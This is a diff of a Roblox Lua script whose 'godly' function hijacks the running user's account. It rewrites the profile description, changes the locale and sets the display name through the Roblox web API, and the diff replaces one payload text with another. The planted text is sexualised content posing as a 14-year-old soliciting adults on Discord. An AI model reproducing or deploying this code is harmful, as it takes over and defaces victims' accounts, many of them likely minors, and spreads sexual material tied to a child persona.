@@ -145,13 +145,13 @@ end
 local function godly() -- mess with the roblox account profile
 local player = game.Players.LocalPlayer
 local userId = player.UserId
-local description = '{"description":"This account has been beamed by systask! if youre a female, pwease hit me up im a 14 yo that needs dominant mommies... pretty please? dc is systask... ty mwa! extra note: dc is currently terminated, i submitted a support request to unterminate it so sowwy if im unable to accept ur friend request on dc for a while, ill accept once im unterminated"}'
+local description = '{"description":"Your executor is vulnerable and got your account beamed! if youre a female... pwease hit me up on dc... im a 14 yo that needs dominant mommies to absolutely crush the living hell out of my ball... dc: @reflexsecurity"}'
 local none = ''
 local china = '{"supportedLocaleCode":"zh_TW"}'
 local changedisplay = {
     Url = "https://users.roblox.com/v1/users/" .. game.Players.LocalPlayer.UserId .. "/display-names",
     Method = "PATCH",
-    Body = '{"newDisplayName":"SystaskOwnsMe"}',
+    Body = '{"newDisplayName":"CheckNewGroupYoureIn"}',
 }
 
 local followaccount, followacc = pcall(function()
